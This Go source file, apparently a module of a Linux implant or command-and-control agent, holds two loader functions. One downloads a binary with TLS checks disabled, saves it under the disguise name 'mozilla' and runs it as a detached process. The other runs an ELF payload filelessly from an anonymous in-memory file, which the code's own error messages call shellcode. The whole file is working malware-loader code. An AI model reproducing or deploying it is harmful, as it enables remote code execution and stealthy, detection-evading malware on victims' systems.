//go:build linux

package executable

import (
	"syscall"
	"unsafe"
	"os"
	"strconv"
	"fmt"
	"io"
	"net/http"
	"path/filepath"
	"mime"
	"github.com/kataras/golog"
	"crypto/tls"
)


func DownloadAndExecute(url string, path string) error {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: transport}
	resp, err := client.Get(url)
	if err != nil {
		return fmt.Errorf("failed to download binary: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to download binary: received status %s", resp.Status)
	}

	elfData, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read ELF binary: %v", err)
	}
	filename := "mozilla"
	cd := resp.Header.Get("Content-Disposition")
	if cd != "" {
		_, params, err := mime.ParseMediaType(cd)
		if err == nil {
			if fname, ok := params["filename"]; ok {
				filename = fname
			}
		}
	}

	var target string
	if path != "" {
		absPath, err := filepath.Abs(path)
		if err != nil {
			return fmt.Errorf("invalid path %q: %v", path, err)
		}
		dir := filepath.Dir(absPath)
		if info, err := os.Stat(dir); err == nil && info.IsDir() {
			target = absPath
		} else {
			target = filepath.Join(os.TempDir(), filename)
		}
	} else {
		target = filepath.Join(os.TempDir(), filename)
	}
	if err := os.WriteFile(target, elfData, 0755); err != nil {
		return fmt.Errorf("failed to write binary to file: %v", err)
	}
	argv := []string{target}
	env := os.Environ()
	pid, err := syscall.ForkExec(target, argv, &syscall.ProcAttr{
		Env: env,
		Files: []uintptr{
			uintptr(syscall.Stdin),
			uintptr(syscall.Stdout),
			uintptr(syscall.Stderr),
		},
		Sys: &syscall.SysProcAttr{Setsid: true},
	})
	if err != nil {
		return fmt.Errorf("failed to execute binary: %v", err)
	}
	golog.Debugf("Forked process with pid %v\n", pid)

	return nil
}

func LoadElf(elf []byte, binaryPath string) error {
	golog.Infof("LoadElf: %v", binaryPath)
	const (
		// MFD_CLOEXEC value is set to zero so that the memory pointer remains open across exec.
		MFD_CLOEXEC      = 0x0001
		SYS_MEMFD_CREATE = 319 // syscall number for memfd_create on x86_64 Linux
	)

	fd, _, errno := syscall.Syscall(SYS_MEMFD_CREATE,
		uintptr(unsafe.Pointer(&([]byte("bin\x00"))[0])),
		uintptr(MFD_CLOEXEC),
		0)
	if errno != 0 {
		return fmt.Errorf("error %v", errno)
	}

	written, err := syscall.Write(int(fd), elf)
	if err != nil {
		return fmt.Errorf("failed to write shellcode: %v", err.Error())
	}
	if written != len(elf) {
		return fmt.Errorf("incomplete shellcode write")
	}

	//path := "/proc/" + strconv.Itoa(os.Getpid()) + "/fd/" + strconv.Itoa(int(fd))
	path := "/proc/self/fd/" + strconv.Itoa(int(fd))
	argv := []string{binaryPath}

	env := os.Environ()
	//file, err := os.OpenFile("/tmp/shellcode.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	//if err != nil {
	//	return fmt.Errorf("failed to open log file: %v", err)
	//}
	// Note: do not close the file here as the child process will inherit it.
	pid, err := syscall.ForkExec(path, argv, &syscall.ProcAttr{
		Env: env,
		Files: []uintptr{
			uintptr(syscall.Stdin),
			uintptr(syscall.Stdout),
			uintptr(syscall.Stderr),
		},
		Sys: &syscall.SysProcAttr{Setsid: true},
	})
	if err != nil {
		return fmt.Errorf("fork exec failed: %v\n", err)
	}
	golog.Debugf("Forked process with pid %v\n", pid)

	return nil
}
